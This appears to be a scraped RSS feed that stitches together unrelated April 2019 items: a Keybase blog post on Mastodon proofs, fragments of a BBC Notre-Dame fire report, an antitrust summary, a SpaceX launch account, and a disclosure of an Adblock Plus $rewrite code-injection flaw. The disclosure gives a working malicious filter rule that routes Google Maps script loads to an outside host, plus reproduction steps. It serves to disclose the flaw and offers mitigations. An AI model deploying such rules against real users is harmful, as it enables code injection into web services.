<title>Mastodon and Keybase</title>

<description>&lt;center&gt;
&lt;div&gt;&lt;img class=&quot;img img-responsive&quot; alt=&quot;mastodon + keybase = true love 4eva&quot; src=&quot;https://keybase.io/images/blog/mastodon/mastodon_title4.png&quot;/&gt;&lt;/div&gt;
&lt;/center&gt;
&lt;p&gt;&lt;strong&gt;April 15, 2019&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Today we're announcing that Keybase has a new, open proof protocol, and we've kicked it off with the &lt;strong&gt;Mastodon Fediverse&lt;/strong&gt;. Already, 31 communities are live (&lt;a href=&quot;https://mastodon.social/&quot;&gt;mastodon.social&lt;/a&gt;, &lt;a href=&quot;https://witches.live/&quot;&gt;witches.live&lt;/a&gt;, &lt;a href=&quot;https://aus.social/&quot;&gt;aus.social&lt;/a&gt;, etc.), with many more in the coming days.&lt;/p&gt;
&lt;p&gt;Previously, Keybase only supported the mega-behemoths: Twitter, Facebook, Reddit, Github, and HackerNews. This new protocol change isn't just for Mastodon; we're ripping Keybase wide open, so &lt;strong&gt;any community can cryptographically connect profiles to Keybase.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Everyone from a small phpBB forum to a big site such as Etsy, GitLab, or StackOverflow is welcome to do this easy integration.&lt;/p&gt;
&lt;h2 id=&quot;first-what-is-mastodon-&quot;&gt;First, what is Mastodon?&lt;/h2&gt;
&lt;p&gt;Mastodon is a microblogging social network. It's like Twitter, except anyone can administer an &quot;instance,&quot; on a domain of their choice, letting in whatever members they want.&lt;/p&gt;
&lt;p&gt;If you're on an instance called &lt;strong&gt;cereal.eaters&lt;/strong&gt; and I'm on an instance called &lt;strong&gt;milk-providers.org&lt;/strong&gt;, we can follow each other and see each other's &quot;toots&quot; across the network. Censorship rules are up to the instances. This is federation at its finest.&lt;/p&gt;
&lt;p&gt;It's pretty slick, and it honors the original spirit of the Internet.&lt;/p&gt;
&lt;h2 id=&quot;keybase-proofs&quot;&gt;Keybase Proofs&lt;/h2&gt;
&lt;p&gt;Keybase is a secure (as in cryptography) app for groups, communities, families, and friends. At its core is &lt;strong&gt;identity&lt;/strong&gt;. Keybase is a catalog of connected identities and keys. For example, here's my friend &lt;strong&gt;tammy&lt;/strong&gt; :&lt;/p&gt;
&lt;center&gt;
&lt;div&gt;&lt;img class=&quot;img img-responsive&quot; alt=&quot;tammy camp keybase&quot; src=&quot;https://keybase.io/images/blog/mastodon/tammy_camp.png&quot;/&gt;&lt;/div&gt;
&lt;/center&gt;
&lt;p&gt;I know her as &lt;a href=&quot;https://twitter.com/tammycamp&quot;&gt;@tammycamp&lt;/a&gt; on Twitter, and Keybase teaches me she's also &lt;a href=&quot;https://www.reddit.com/user/hodl_strong&quot;&gt;u/hodl_strong&lt;/a&gt; on Reddit. Further, Keybase lets me have an &lt;em&gt;encrypted&lt;/em&gt; chat with her, or add her to a group I'm building. I can feel safe I'm talking to the right person.&lt;/p&gt;
&lt;p&gt;My Keybase app actually checks that she posted a &lt;a href=&quot;https://twitter.com/tammycamp/status/972933694062145536&quot;&gt;signed tweet&lt;/a&gt; on Twitter.&lt;/p&gt;
&lt;h2 id=&quot;an-example-of-our-old-way-of-doing-things&quot;&gt;An example of our old way of doing things&lt;/h2&gt;
&lt;p&gt;Let's walk through one. In our scenario, Keybase user &lt;strong&gt;haraldbluetooth&lt;/strong&gt; wants to prove he is &lt;strong&gt;@toothyharald&lt;/strong&gt; on Twitter.&lt;/p&gt;
&lt;p&gt;After typing his Twitter handle into the Keybase app, Harald goes through these screens:&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;img img-responsive&quot; alt=&quot;proof flow&quot; src=&quot;https://keybase.io/images/blog/mastodon/keybase_proof_flow.png&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;problems-with-the-old-way&quot;&gt;Problems with the old way&lt;/h2&gt;
&lt;p&gt;Pretty quick and easy, right?&lt;/p&gt;
&lt;p&gt;Still, we think this flow is choppy. Harald's Keybase app can tell him exactly what to tweet, but once he's in Twitter, Keybase is just sitting around, hoping he didn't change anything before posting.&lt;/p&gt;
&lt;p&gt;Problems:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;posting is brittle&lt;/strong&gt;; Twitter may not link to a screen with the tweet pre-filled. Also Harald may edit the tweet and mess it up. Twitter will still let him post it, but it will be nonsense.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;people can post false claims on Twitter&lt;/strong&gt;; Keybase wouldn't understand or honor them, but a tweet that's a lie might confuse Twitter users.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;every site is different&lt;/strong&gt;; Keybase needs to understand how to look up tweets, parse them, confirm the author, distinguish usernames, etc. It would be easier if Twitter could tell Keybase apps how it works and how to look up a proof.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;the tweets flow into history&lt;/strong&gt;; how can someone start on Harald's Twitter profile and know his Keybase username?&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;our-new-protocol&quot;&gt;Our new protocol&lt;/h2&gt;
&lt;p&gt;Mastodon has done all this right, starting in &lt;a href=&quot;https://blog.joinmastodon.org/2019/04/mastodon-2.8/&quot;&gt;Mastodon version 2.8&lt;/a&gt;. And now &lt;a href=&quot;https://keybase.io/docs/proof_integration_guide&quot;&gt;anyone else can, too&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Here’s what the proof flow looks like for Mastodon. When &lt;strong&gt;haraldbluetooth&lt;/strong&gt; claims in Keybase that he's &lt;strong&gt;allmyteeth&lt;/strong&gt; on &lt;strong&gt;mastodon.social&lt;/strong&gt;, he lands on a &lt;strong&gt;mastodon.social&lt;/strong&gt; page:&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;img img-responsive&quot; alt=&quot;proof flow&quot; src=&quot;https://keybase.io/images/blog/mastodon/new_flow.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Further, His &lt;strong&gt;mastodon.social&lt;/strong&gt; page shows this special row:&lt;/p&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;p&gt;This, unlike a Tweet or Toot that could say anything, only shows up on his Mastodon page if it's legit.&lt;/p&gt;
&lt;p&gt;FINAL RESULT: if you know Harald on Mastodon, you can end up with his keys! Or if you know him on Keybase or elsewhere, Keybase teaches you about his Mastodon identity. All cryptographically verifiable.&lt;/p&gt;
&lt;h2 id=&quot;for-programmers-a-neat-bonus&quot;&gt;For programmers...a neat bonus&lt;/h2&gt;
&lt;p&gt;You can send encrypted messages from the command line, using these proofs.&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;lang-bash&quot;&gt;
keybase chat send haraldbluetooth &lt;span class=&quot;hljs-string&quot;&gt;&quot;Ensam är stark!&quot;&lt;/span&gt;
keybase chat send allmyteeth@mastodon.social &lt;span class=&quot;hljs-string&quot;&gt;&quot;Ensam är stark!&quot;&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Or, using the Keybase chat API&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;lang-bash&quot;&gt;&lt;span class=&quot;hljs-built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;'{&quot;method&quot;: &quot;send&quot;, &quot;params&quot;: {&quot;options&quot;: {&quot;channel&quot;: {&quot;name&quot;: &quot;allmyteeth@mastodon.social&quot;}, &quot;message&quot;: {&quot;body&quot;: &quot;Ensam är stark!&quot;}}}}'&lt;/span&gt; | keybase chat api
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Your Keybase app will verify all the crypto, and the chat will appear:&lt;/p&gt;
&lt;center&gt;
&lt;div&gt;&lt;img class=&quot;img img-responsive&quot; alt=&quot;viking tribute&quot; src=&quot;https://keybase.io/images/blog/mastodon/skit.png&quot;/&gt;&lt;/div&gt;
&lt;/center&gt;
&lt;h2 id=&quot;what-the-mastodon-project-had-to-do&quot;&gt;What the Mastodon project had to do&lt;/h2&gt;
&lt;p&gt;It wasn't a large project. They had to create or update a couple JSON endpoints, a config file, and an extra screen to handle this proof connection. &lt;a href=&quot;https://keybase.io/docs/proof_integration_guide&quot;&gt;Any site can do it&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Keybase profiles - in both the app and website - now link to Mastodon.&lt;/p&gt;
&lt;p&gt;That's it. If your team builds a site or app with members, go for it. If you &lt;em&gt;use&lt;/em&gt; an app or website you'd like to see connected to Keybase, you can send them this page.&lt;/p&gt;
&lt;p&gt;Having fun!&lt;/p&gt;
&lt;p&gt;💖 Keybase&lt;/p&gt;
&lt;hr/&gt;&lt;div class=&quot;blog-faq&quot; readability=&quot;64.072406181015&quot;&gt;
&lt;h2 id=&quot;faq&quot;&gt;FAQ&lt;/h2&gt;
&lt;h3 id=&quot;i-m-on-a-team-that-s-interested-how-do-we-get-our-project-connected-to-keybase-&quot;&gt;I'm on a team that's interested. How do we get our project connected to Keybase?&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://keybase.io/docs/proof_integration_guide&quot;&gt;Here's our integration guide&lt;/a&gt;. It's still a bit rough around the edges, but it should only take a day or two of programming to get your side done.&lt;/p&gt;
&lt;h3 id=&quot;i-run-an-mastodon-instance-am-i-already-added-&quot;&gt;I run an Mastodon instance. Am I already added?&lt;/h3&gt;
&lt;p&gt;Perhaps. If not, reach out to &lt;a href=&quot;https://keybase.io/xgess&quot;&gt;xgess&lt;/a&gt;.&lt;/p&gt;
&lt;h3 id=&quot;i-really-want-the-admins-of-site-x-to-integrate-with-keybase-&quot;&gt;I REALLY want the admins of Site X to integrate with Keybase.&lt;/h3&gt;
&lt;p&gt;Get ON them!&lt;/p&gt;
&lt;h3 id=&quot;what-are-your-hopes-and-dreams-&quot;&gt;What are your hopes and dreams?&lt;/h3&gt;
&lt;p&gt;We would love to connect Keybase to &lt;strong&gt;any forum and messageboard software&lt;/strong&gt;, &lt;strong&gt;GitLab&lt;/strong&gt;, &lt;strong&gt;NPM&lt;/strong&gt;, &lt;strong&gt;Ruby Gems&lt;/strong&gt;, other code publishers, and even &lt;strong&gt;LinkedIn&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Over the years, people have asked us for various integrations in &lt;a href=&quot;https://github.com/keybase/keybase-issues/issues/518&quot;&gt;this ticket&lt;/a&gt;. If you know anyone on any of those teams, it's now in their hands...we'll be standing by to help out.&lt;/p&gt;
&lt;h3 id=&quot;i-think-you-should-do-this-slightly-differently-&quot;&gt;I think you should do this slightly differently.&lt;/h3&gt;
&lt;p&gt;Please &lt;a href=&quot;https://github.com/keybase/client/issues&quot;&gt;let us know&lt;/a&gt;. We can expand and improve this.&lt;/p&gt;
&lt;h3 id=&quot;why-mastodon-first-&quot;&gt;Why Mastodon first?&lt;/h3&gt;
&lt;p&gt;Because our users requested it in force. And because we feel like there are shared values here. And because they were willing, helpful partners (thanks @gargron).&lt;/p&gt;
&lt;h3 id=&quot;are-there-sites-you-won-t-link-to-&quot;&gt;Are there sites you won't link to?&lt;/h3&gt;
&lt;p&gt;Like a Mastodon instance, we reserve the right to work with whichever partners we prefer. We specifically will avoid at least these sites:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;sites which encourage or are known for illegal activity&lt;/li&gt;
&lt;li&gt;sites which primarily link to advertisements&lt;/li&gt;
&lt;li&gt;sites which feel tiny and spammy. We don't want 10,000 partners with 5 members each; if you run, say, a family or apartment website, you don't need to do this integration. Just prove ownership of the domain in the old Keybase way, putting your family's proofs in yoursite.com/keybase.txt&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;what-s-next-&quot;&gt;What's next?&lt;/h3&gt;
&lt;p&gt;We're toying with an idea of auto-creating teams based on these integrations. If you run &lt;strong&gt;sitex.org&lt;/strong&gt;, then your connected users could also automatically end up in &lt;strong&gt;teamx&lt;/strong&gt; on Keybase, in channels of your choice, for encrypted chat and file sharing. If you run a larger community or site and are interested in talking about this feature, reach out to &lt;a href=&quot;https://keybase.io/chris&quot;&gt;chris&lt;/a&gt; on Keybase. We could prioritize it.&lt;/p&gt;
&lt;h3 id=&quot;what-else-&quot;&gt;What else?&lt;/h3&gt;
&lt;p&gt;Some big visual design changes in ~2 weeks.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://keybase.io/download&quot;&gt;DOWNLOAD KEYBASE ALREADY!&lt;/a&gt;&lt;/p&gt;

The cause of the fire is not yet clear.&lt;/p&gt;&lt;p&gt;But officials say it could be linked to the renovation work that began after cracks appeared in the stone, &lt;a href=&quot;https://www.bbc.co.uk/news/av/world-europe-43258266/notre-dame-cracks-in-the-cathedral&quot; class=&quot;story-body__link&quot;&gt;sparking fears the structure could become unstable.&lt;/a&gt;&lt;/p&gt;&lt;p&gt;The Paris prosecutor's office said it has opened an inquiry into &quot;accidental destruction by fire&quot;.&lt;/p&gt;&lt;ul class=&quot;story-body__unordered-list&quot;&gt;&lt;li class=&quot;story-body__list-item&quot;&gt;&lt;a href=&quot;https://www.bbc.com/news/live/world-europe-47942176&quot; class=&quot;story-body__link&quot;&gt;Live updates&lt;/a&gt;&lt;/li&gt;

&lt;/ul&gt;&lt;p&gt;Visiting the scene, Mr Macron said the &quot;worst had been avoided&quot; and that an international fundraising scheme to rebuild the cathedral would be launched. &lt;/p&gt;&lt;figure class=&quot;media-portrait no-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;

We can be only horrified by what we see&quot;.&lt;/p&gt;&lt;h2 class=&quot;story-body__crosshead&quot;&gt;How have people reacted?&lt;/h2&gt;&lt;p&gt;Thousands of people gathered in the streets around the cathedral, observing the flames in silence. Some could be seen openly weeping, while others sang hymns or said prayers. &lt;/p&gt;&lt;p&gt;Several churches around Paris rang their bells in response to the blaze. &lt;/p&gt;&lt;!-- IDT Image Slider (notre-dame) include --&gt;

Its main rival as a national symbol, the Eiffel Tower, is little more than a century old. Notre-Dame has stood tall above Paris since the 1200s.&lt;/p&gt;&lt;p&gt;It has given its name to one of the country's literary masterpieces. Victor Hugo's The Hunchback of Notre-Dame is known to the French simply as Notre-Dame de Paris.&lt;/p&gt;&lt;p&gt;The last time the cathedral suffered major damage was during the French Revolution. It survived two world wars largely unscathed.&lt;/p&gt;&lt;p&gt;Watching such an embodiment of the permanence of a nation burn and its spire collapse is profoundly shocking to any French person. &lt;/p&gt;&lt;ul class=&quot;story-body__unordered-list&quot;&gt;&lt;li class=&quot;story-body__list-item&quot;&gt;&lt;a href=&quot;https://www.bbc.co.uk/news/world-europe-47942786&quot; class=&quot;story-body__link&quot;&gt;Read more from Henri&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;figure class=&quot;media-landscape no-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;

<title>How Apple, Google, and other tech companies conspired against their own workers</title>
<link>https://www.whenrulesdontapply.com/</link>
<guid isPermaLink="true" >https://www.whenrulesdontapply.com/</guid>
<description>&lt;p&gt;Changing jobs is a common path to seek better pay and professional advancement. But this time-honored free market practice was secretly inhibited by top Silicon Valley tech executives who colluded through &quot;no-poach&quot; agreements that suppressed the wages and opportunities of their employees.&lt;/p&gt;&lt;p&gt;The U.S. Department of Justice and the California Attorney General’s office undertook legal action against Apple, Adobe, Intel, eBay, Pixar, Intuit, and Lucasfilm in a unique application of antitrust law in defense of labor rights.&lt;/p&gt;&lt;p&gt;A separate class action lawsuit was filed on behalf of 64,000 tech workers for an estimated $3 billion in lost wages. Before the case went to trial, the companies settled for a total of $435 million.&lt;/p&gt;

<title>Adblock Plus filter lists may execute arbitrary code in web pages</title>
<link>https://armin.dev/blog/2019/04/adblock-plus-code-injection/</link>
<guid isPermaLink="true" >https://armin.dev/blog/2019/04/adblock-plus-code-injection/</guid>
<description>&lt;p&gt;A new version of &lt;a href=&quot;https://adblockplus.org&quot;&gt;Adblock Plus&lt;/a&gt; was &lt;a href=&quot;https://adblockplus.org/releases/adblock-plus-32-for-chrome-firefox-and-opera-released&quot;&gt;released&lt;/a&gt; on July 17, 2018. Version 3.2 introduced a new filter option for rewriting requests. A day later &lt;a href=&quot;https://getadblock.com&quot;&gt;AdBlock&lt;/a&gt; followed suit and released support for the new filter option. &lt;a href=&quot;https://www.ublock.org&quot;&gt;uBlock&lt;/a&gt;, being owned by AdBlock, also implemented the feature.&lt;/p&gt;
&lt;p&gt;Under certain conditions the &lt;code&gt;$rewrite&lt;/code&gt; filter option enables filter list maintainers to inject arbitrary code in web pages.&lt;/p&gt;
&lt;p&gt;The affected extensions have more than 100 million active users, and the feature is trivial to exploit in order to attack any sufficiently complex web service, including Google services, while attacks are difficult to detect and are deployable in all major browsers.&lt;/p&gt;
&lt;p&gt;Considering the nature and implications of the uncovered vulnerabilities, and given that filter lists have been employed in the past for &lt;a href=&quot;https://github.com/uBlockOrigin/uBlock-issues/issues/285&quot;&gt;politically motivated attacks&lt;/a&gt;, details of the exploit chain are publicly disclosed to ensure the fastest possible propagation of upcoming mitigations in the affected browser extensions and web services.&lt;/p&gt;
&lt;h2 id=&quot;attack&quot;&gt;Attack&lt;/h2&gt;
&lt;p&gt;The &lt;code&gt;$rewrite&lt;/code&gt; filter option is used by some ad blockers to remove tracking data and block ads by redirecting requests. The option allows rewrites only within the same origin, and requests of &lt;code&gt;SCRIPT&lt;/code&gt;, &lt;code&gt;SUBDOCUMENT&lt;/code&gt;, &lt;code&gt;OBJECT&lt;/code&gt; and &lt;code&gt;OBJECT_SUBREQUEST&lt;/code&gt; types are not processed.&lt;/p&gt;
&lt;p&gt;However, web services can be exploited with the help of this filter option when they use XMLHttpRequest or Fetch to download code snippets for execution, while allowing requests to arbitrary origins and hosting a server-side open redirect.&lt;/p&gt;
&lt;p&gt;Extensions periodically update filters at intervals determined by filter list operators. Attacks are difficult to detect because the operator may set a short expiration time for the malicious filter list, which is then replaced with a benign one. Organizations and individuals may be targeted based on the IP addresses from which the updates are requested.&lt;/p&gt;
&lt;p&gt;The following criteria must be met for a web service to be exploitable using this method:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;The page must load a JS string using XMLHttpRequest or Fetch and execute the returned code&lt;/li&gt;
&lt;li&gt;The page must not restrict origins from which it can fetch using Content Security Policy directives, or it must not validate the final request URL before executing the downloaded code&lt;/li&gt;
&lt;li&gt;The origin of the fetched code must have a server-side open redirect or it must host arbitrary user content&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;Filter list operators may deliver a rule update such as this:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;/^https://www.google.com/maps/_/js/k=.*/m=pw/.*/rs=.*/$rewrite=/search?hl=en-US&amp;amp;source=hp&amp;amp;biw=&amp;amp;bih=&amp;amp;q=majestic-ramsons.herokuapp.com&amp;amp;btnI=I%27m+Feeling+Lucky&amp;amp;gbv=1
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;The above rule redirects the target request to Google’s &lt;em&gt;I’m Feeling Lucky&lt;/em&gt; search service, which then redirects to a page with the payload: &lt;code&gt;alert(document.domain)&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Steps for running arbitrary code on Google Maps:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Install either Adblock Plus, AdBlock or uBlock in a new browser profile&lt;/li&gt;
&lt;li&gt;Visit the options of the extension and add the &lt;a href=&quot;https://majestic-ramsons.herokuapp.com/filter-list.txt&quot;&gt;example filter list&lt;/a&gt;, this step is meant to simulate a malicious update to a default filter list&lt;/li&gt;
&lt;li&gt;Navigate to &lt;a href=&quot;https://www.google.com/maps&quot;&gt;Google Maps&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;An alert with “www.google.com” should pop up after a couple of seconds&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;Gmail and Google Images also meet the listed conditions to be exploitable.&lt;/p&gt;
&lt;p&gt;Google has been notified about the exploit, but the report was closed as “Intended Behavior”, since they consider the potential security issue to be present solely in the mentioned browser extensions. This is an unfortunate conclusion, because the exploit is composed of a set of browser extension and web service vulnerabilities that have been chained together.&lt;/p&gt;
&lt;p&gt;Please note that the vulnerability is not limited to Google services, other web services could be affected as well.&lt;/p&gt;
&lt;h2 id=&quot;mitigation&quot;&gt;Mitigation&lt;/h2&gt;
&lt;p&gt;The exploit can be mitigated in the affected web services by whitelisting known origins using the &lt;code&gt;connect-src&lt;/code&gt; CSP header, or by eliminating server-side open redirects.&lt;/p&gt;
&lt;p&gt;Ad blocking extensions should consider dropping support for the &lt;code&gt;$rewrite&lt;/code&gt; filter option. It’s always possible to abuse the feature to some degree, even if only images or style sheets are allowed to be redirected.&lt;/p&gt;
&lt;p&gt;Users may also switch to &lt;a href=&quot;https://github.com/gorhill/uBlock&quot;&gt;uBlock Origin&lt;/a&gt;. It does not support the &lt;code&gt;$rewrite&lt;/code&gt; filter option and it is not vulnerable to the described attack.&lt;/p&gt;

<title>What It&amp;#039;s Like to View a SpaceX Falcon Heavy Launch</title>
<link>https://olivierforget.net/blog/2019/viewing-spacex-falcon-heavy-launch/</link>
<guid isPermaLink="true" >https://olivierforget.net/blog/2019/viewing-spacex-falcon-heavy-launch/</guid>
<description>&lt;p&gt;I flew to Florida to witness in person the awesome power of the &lt;a href=&quot;https://www.spacex.com/falcon-heavy&quot;&gt;Falcon Heavy&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;My viewing location for the launch of &lt;a href=&quot;https://en.wikipedia.org/wiki/Arabsat-6A&quot;&gt;Arabsat 6a&lt;/a&gt; was Banana Creek within the Kennedy Space Center, also known as “Feel The Heat” in KSC’s launch viewing nomenclature. It is 3.9 miles due West of the launch pad, as close as one can be for such a launch. I do not want my recollection of this experience to become clouded with time, so here are my notes.&lt;/p&gt;

&lt;p&gt;I traveled alone for this event and I expected be alone most of the time. Boy was I wrong. I had many wonderful conversations with other space fans. I met a lot of people from different walks of life, and from many places further than my home in Nashville. Some I met in person after communicating on a Slack channel connected to the &lt;a href=&quot;https://www.reddit.com/r/spacex&quot;&gt;/r/spacex&lt;/a&gt; subreddit, but most were other excited space geeks who were waiting in line for a bus for the umpteenth time.&lt;/p&gt;
&lt;p&gt;Apart from the FH launch, other big space events were happening: the first photo of a black hole was revealed and &lt;a href=&quot;https://en.wikipedia.org/wiki/Beresheet&quot;&gt;Beresheet&lt;/a&gt; was scheduled to land while we were waiting for launch. We all followed the progress of the Israeli lander while sitting in the bleachers and commiserated when word of its demise came through. The bleachers are so stocked with space nerds that when I wondered what Beresheet had launched on I asked the person nearest me and got an immediate answer: it was a Falcon 9. Where else can you ask that question to anybody and get an answer?&lt;/p&gt;
&lt;p&gt;As the countdown clock ticks past milestones, the crowd begins to react more and more excitedly. At the 1 hour mark big cheers erupt. Each time the announcer mentioned even the vaguest possibility of a scrub, he would elicit boos from the crowd. We’re all passionate, excited and jittery in the bleachers. It makes for swift and audible reactions every time something happens. A puff of oxygen emanates from the rocket? Wild cheers. The announcer reminds us that they will scrub if they notice anything wrong during the last second of the countdown? Merciless booing.&lt;/p&gt;

&lt;p&gt;It is hard to sit across the water from pad 39A and not think about its history.&lt;/p&gt;
&lt;p&gt;Every person who walked on the moon launched from that same chunk of concrete. It’s remarkable to think that humans boarded a ship in this location and sailed across the vast expanses of space to reach another rock to call home. I noticed the moon hanging directly over 39A and the symbolism was perfect. A vast expanse of featureless sky between a rocket pad and its destination.&lt;/p&gt;
&lt;div class=&quot;history-photos&quot; readability=&quot;39.9&quot;&gt;&lt;img src=&quot;https://olivierforget.net/blog/2019/viewing-spacex-falcon-heavy-launch/media/apollo11-history.jpg&quot; alt=&quot;A Saturn V rocket lifts off from Pad 39A&quot;/&gt;&lt;p&gt;Apollo 11, July 16 1969.

&lt;img src=&quot;https://olivierforget.net/blog/2019/viewing-spacex-falcon-heavy-launch/media/space-shuttle-history.jpg&quot; alt=&quot;A Space Shuttle lifts off from Pad 39A&quot;/&gt;&lt;p&gt;Eighty-two Space Shuttles were launched from this same pad, among them the very first and last.

&lt;img src=&quot;https://olivierforget.net/blog/2019/viewing-spacex-falcon-heavy-launch/media/arabsat-history.jpg&quot; alt=&quot;Spacex Falcon Heavy lifts off from Pad 39A&quot;/&gt;&lt;p&gt;What I saw: Falcon Heavy, 2019, same pad. Photo credit: &lt;a href=&quot;https://www.flickr.com/photos/spacex/40628438523/&quot;&gt;SpaceX&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;&lt;em&gt;Original idea for this sequence of photos from this &lt;a href=&quot;https://twitter.com/ChrisG_NSF/status/1116716429636788226&quot;&gt;tweet&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Soon, if all goes according to plan, US astronauts will launch into space from US soil aboard US rockets for the first time since the end of the Space Shuttle. They will do so from 39A.&lt;/p&gt;

&lt;p&gt;This is the thing most people wonder about. Home speakers or even good headphones can’t replicate the sound in your living room, so what is it really like?&lt;/p&gt;
&lt;p&gt;It begins with silence. It takes 18 seconds for the sound to travel from the pad to your ears. When the engines are lit, an immense angry cloud jets out from the side of the launch pad signaling that beast has awakened. However there is no sound. The Heavy lifts off and climbs. Still no sound. A rocket can travel a long way in 18 seconds, and I began to feel a real disconnect between what I was seeing and what I was hearing.&lt;/p&gt;
&lt;p&gt;We had been told it was possible to see the sound waves coming across the water. I saw no such thing. My first indication of sound was this sense of deep motion in the air, the lowest deepest notes I can imagine hearing. It’s a soft, pleasant experience that soon gives way to an ever increasing roar. Finally, things sound like they are supposed to.&lt;/p&gt;
&lt;p&gt;The roar sounds just like just what it is: an immense amount of energy unleashed all at once. It builds gradually in intensity while dropping in pitch (due to the Doppler effect.) It’s a roar that you can feel in your chest, and that is why headphones can’t replicate the experience.&lt;/p&gt;
&lt;p&gt;It then begins to crackle and pop. I used to think the crackling of rockets in launch videos was due to limitations of the recording equipment. It turns out it’s the &lt;a href=&quot;https://www.quora.com/Why-did-the-space-shuttles-rockets-make-popping-sounds-as-opposed-to-a-smooth-rumbling-noise-during-liftoff/answer/Kent-Gee&quot;&gt;physics of the atmosphere&lt;/a&gt;. Imagine a loud thunderclap. Now imagine that sound in a continuous loop. You’re getting close.&lt;/p&gt;
&lt;p&gt;Then, very quickly, it becomes quiet again. The Heavy accelerates away so fast that it doesn’t take long for it to go out of earshot.&lt;/p&gt;

&lt;p&gt;I was not prepared for this.&lt;/p&gt;
&lt;p&gt;Once the rocket cleared the tower and the plume was in full view, I felt like I was looking into the sun. It was so bright my eyes instinctively wanted to look away. But we had waited 6 hours for the launch to go off the day before, and 4 more hours today in addition to all the bus lines, so when that rocket finally made itself visible I was not going to look away. Too bad for my retinas, let ‘em burn. I am not taking my eyes off that rocket.&lt;/p&gt;

&lt;p&gt;I have watched many webcasts of SpaceX launches and they are a great way of following the action and getting a taste for the excitement from home. However to see it in real life brings a new dimension to the event. It becomes less about zoomed in views and performance data, and more about the vast expanses, the palpable speeds and dizzying altitudes. We were able to see the different elements play on the vast stage that is the sky in one continuous take.&lt;/p&gt;
&lt;p&gt;I threw together a couple of graphics based on the few pics I took with my phone to show the sequence as we saw it:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://olivierforget.net/blog/2019/viewing-spacex-falcon-heavy-launch/media/launch-sequence.jpg&quot; alt=&quot;Launch&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;a href=&quot;https://olivierforget.net/blog/2019/viewing-spacex-falcon-heavy-launch/media/launch-original.jpg&quot;&gt;Full size original photo&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;
&lt;ol readability=&quot;13&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;Launch! Much excitement. Once it clears the tower the rocket plus its giant plume makes for a satisfyingly large and shockingly bright thing to look at from Banana Creek.&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;3&quot;&gt;
&lt;p&gt;Sound is finally getting to our ears. The rocket is accelerating and is starting to turn downrange, meaning we see less of its side and more its tailpipe. It’s an impressive sight, like a three-eyed Sauron.&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;5&quot;&gt;
&lt;p&gt;Aw shoot. We launched into a perfectly clear sky, but the rocket created a contrail that grew into a cloud, hiding itself from our view. Last we saw of it, it was headed straight away from us. It’s quiet in the bleachers. Surely the party’s not already over, is it?&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;3&quot;&gt;
&lt;p&gt;Falcon Heavy reappears below the cloud as a wide orange triangle. Wild cheers from the crowd. It is below the cloud because it is now heading more away from us than up, like an airplane headed for the horizon. The plume has grown so much in the rarified air that we still see it as a distinct shape. It quickly gets dimmer as the rocket accelerates away from us.&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;3&quot;&gt;
&lt;p&gt;Booster separation! By this point we’re really straining to see clearly, but I did see the boosters separate as two little sticks that fell off to each side. After a few more seconds we could see the two additional smoky plumes from the boost-back burn. As soon as that burn ended we lost sight of the side boosters.&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;By the time the photo was taken the center core was accelerating fast away from us and about to disappear for good.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://olivierforget.net/blog/2019/viewing-spacex-falcon-heavy-launch/media/landing-sequence.jpg&quot; alt=&quot;Landing&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;a href=&quot;https://olivierforget.net/blog/2019/viewing-spacex-falcon-heavy-launch/media/landing-original.jpg&quot;&gt;Full size original photo&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;
